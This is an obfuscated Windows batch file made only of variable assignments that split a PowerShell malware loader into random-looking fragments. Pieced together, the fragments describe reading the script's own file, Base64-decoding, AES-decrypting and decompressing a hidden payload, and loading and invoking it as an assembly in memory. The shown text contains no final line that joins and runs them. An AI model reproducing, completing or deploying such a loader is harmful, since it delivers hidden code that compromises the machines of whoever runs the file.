@echo off
set "lmbOusiVYK=pher"
set "CgkgPeeUGs=ptog"
set "uddMKVziNy=oin "
set "PAAxhMFKrB=comm"
set "evKSNikHcy=nage"
set "zULHKAhRBr='txe"
set "dldznDpQLM=raph"
set "DopujJrqVY=Disp"
set "HWZnLpSjhs=em.C"
set "oddboQpSTK=A.Su"
set "AMxDdyOZsb=rofi"
set "CcdIGcwwCX=, (,"
set "goaQyYTngz=yTo("
set "bbkFpFzSfB=]::("
set "KSUEMmCsfW=LOQ "
set "QGRyOUCSIt=6esa"
set "uNvAlGHvic=($Dl"
set "CQKByLYWFH=flec"
set "ztcOPMjJGr=rity"
set "VFSnKvWtct=hSXa"
set "dMFOvJcDBA=LIyz"
set "HYvnYunMby=  $r"
set "aTtaNoyKQx=gMod"
set "JSjKddwaWj=xl);"
set "WMTjkqfZMl=('%*'"
set "MyAMiqUsFq=.-16"
set "ncnTpyyRAu=stem"
set "HyHuSvNYsB=oipm"
set "VVeqEHRJqV=mw);"
set "sEcKBFedYm=1] -"
set "sVAoYrKjhH=ode]"
set "bZWWrrxUqi=HLIy"
set "GAiIdEXoDa=y.Ci"
set "nzOBLsSTAL=ewLi"
set "GvmhlOLMMS=pres"
set "CobRBQENQH=ne);"
set "fFzCEtMavo=oipm"
set "HpujviOwuZ=xl.T"
set "NyRppJkXau=.Mod"
set "iKQpKKlsbx=1..-"
set "ULzzjnYlMH=e]::"
set "wrmfDAvYea=D.En"
set "oQYOCqHnFc=yste"
set "zBDECIIUAv=and "
set "bleCZSPIKi=y.Pa"
set "sEavxXrzGt=gth)"
set "kluGxLgBjH=ose("
set "JrQtLySpwF=.Len"
set "MfRcBbARmD===')"
set "ZJLmmiblAX=$VyL"
set "JClfBBLbaP=ipmw"
set "qKJCLhRePK=7;$H"
set "JnLJcQvOFc=.Dis"
set "KYNJirxuUi=lit("
set "IBublEIwlb=('l0"
set "ZWKSZowXPg=join"
set "nZvUrnlZwz=sGUc"
set "naGWDUEQlL=rt]:"
set "tQjebQZwGJ= if "
set "YSxCjYqPDB=ct S"
set "LxDXdCWdJA=]::("
set "UhRVdpsGks=LOQ."
set "rBUIBDlXRT=Comp"
set "wXRBQWRfXR=stem"
set "yzLrJEqwlw=ypto"
set "yUuXCcekno=yste"
set "wfqGwMhqck=tsWi"
set "OVvZqUlmqp=.Cre"
set "ShxvMeOKns=lBlo"
set "cwhwULSfNe=zAm."
set "CgNCTJMkxs=.Dis"
set "KHEzRleGXk=tion"
set "ckxFzwmRzP=gSDG"
set "BxOwhQksaZ=TllA"
set "hPrFgMfaRz=BC;$"
set "JyIvsfLVcW=);$r"
set "fVQNDIxkJW=hy.A"
set "kGnIUvALYL=morF"
set "NRMBPqFIjP=bjec"
set "OrWJbOxkDy=('%~f0'"
set "hqbIXNRDaq=$yHL"
set "qsjOcbszds=('da"
set "FaLOvpyZIZ=vj0m"
set "FkXYYYMlcF=un ="
set "NMrwNzYRZB=a = "
set "FxhKhtzjBX=mory"
set "teSmopYuXZ=LIyz"
set "uJcYAHYWQM=dpLm"
set "fQhGMSGCee=onve"
set "iNWhvxkRfe= = $"
set "RUctQlfiNK=[]] "
set "UokIsmbXrh=ZCwO"
set "oWtXUGVwIR=();$"
set "vBtasMDLst=Am, "
set "negELRBRDU=;$kZ"
set "HcPwIPByqV=);$H"
set "QbpHNrtWfQ=rity"
set "rXkokeWufe=;$Vy"
set "LLgcVKNZqW=..-1"
set "EdmVIMsumd=[Sys"
set "HWtaLPEmAJ=ment"
set "waanUtCgDg=;$dp"
set "zNqbVOEhVh=; };"
set "GLFAmchVod=16] "
set "OQFmoBOrun=th('"
set "CfHNOhhSot=ach "
set "TePiagRxUR=Syst"
set "GtqOlIxkyE=$oip"
set "oafpODJXOa=d;$H"
set "ggMpJvEnXF=LIyz"
set "cISLmGjoFc=FhSX"
set "GjeBmcXCdl=]::C"
set "PejqCtuKAh=::('"
set "ztOfosMbII==');"
set "yVlazwfPwY=.Mem"
set "wfmJfMBZgu=grap"
set "gKcdHmJUBe== [S"
set "gnLwSBbLik=fore"
set "HsJUxpqdwT=)($r"
set "sBzxgfmtjH=Fina"
set "ATotIaVllw=6] -"
set "CaSVDrhBEa=$UMz"
set "XHlYpNLVLp=).Sp"
set "KbYwPFVZfK=saBm"
set "yPilIMVkli=e = "
set "EFyzevhjtz=tem."
set "BTrWIewPZB=se()"
set "DuxWtciACs=z.Pa"
set "udcqHCJEUN=$oip"
set "eqZNvnWSup=em.I"
set "rcqvLYUJAE=]::N"
set "pftQBoeqNu=ispo"
set "eahIPsRfqw= '')"
set "qdQQriDnTo='gni"
set "bdvzBgPdnW=LmD "
set "yQTCFGaFHV=[IO."
set "wUwboJPDfO=Syst"
set "HocorUaCQG=Mode"
set "OqEJWnZMYf=$rQu"
set "LZSbcOandH=v4Ir"
set "PaLqFHmhkU=g = "
set "aVDJWkfLIB=F'[-"
set "pGRpPGUrkQ=esFX"
set "SESIkuWoqr=ress"
set "vtEVuHcbBS=m.IO"
set "UTjPQfdNFb= New"
set "euivEcfQSF=ecry"
set "lTYpZSDtvU=Star"
set "HwRmveGTce=pose"
set "YKvRuvRWpj=urit"
set "OCzdeuKGzc=UMzA"
set "hJhaAaDMSN=OQ.T"
set "biejJpZIxd=m(, "
set "PqzatEnCiB=sion"
set "VbJaWpDEFD=.IO."
set "suEyytXWDD=k; }"
set "clNfGdIjiz=CwO."
set "JXpZpQzPzT=w = "
set "olasQRevoB=ose("
set "sLIYrQvlMI=y]::"
set "WwRVTqyEbS=File"
set "qtesinAPJf=$rQu"
set "ehVzREDnlH=ew-O"
set "YDrxpXFQXZ=736u"
set "qvXmMvllZX=orF'"
set "hOBPIqaUHV=[-1."
set "jYxwQsAeZH=::De"
set "AMAcATYkrk=ress"
set "oCVaCyfwqR=embl"
set "eCRbWpaTJp=)))"
set "gPrUMNmlTl=.Sec"
set "rwyzXzWgvv=();$"
set "GrWclBwKie=ck($"
set "OQjgkrYupz=n ''"
set "jGcKrnIgPn=..-1"
set "QMFhKJvAFm=UGTu"
set "XKLPgcbyTU=($Dl"
set "NaAZMzYdiQ=esMa"
set "TtdtAFlmei=ress"
set "yfQakHAGGU=ect "
set "XwoYLXjgtw=();$"
set "jQwDQLgIVb=pose"
set "ZamKXheEOU=$rQu"
set "emYiuVhwiU=gSDG"
set "ojRtNtjvhY=ke($"
set "RCxLxRtPJp=ZYYc"
set "yVVaZTCJoy=rans"
set "FarkYSUldw='')("
set "vGRNDRXxhF=ddin"
set "DzViBbBlES=:('g"
set "jOdKaMoSzz=);$F"
set "DEQpTErOQR=Conv"
set "MFnxRvTmpw=form"
set "hrqFIziJmt== $H"
set "RRVyWNxPbQ=rtS4"
set "cpxkGMOhks=yz.I"
set "yaKDTuYgZB=m.Re"
set "tLXuBrYBGX=Secu"
set "KMpqRwKRUx=ionM"
set "IfKpVUBMpO=Obje"
set "ziMqwVaaaB=ateD"
set "ZgOlSkUVHY=raph"
set "xuGAHrUYyF=ay()"
set "mrbUYujGOT=Quxl"
set "bqOuHSYJMI=ert]"
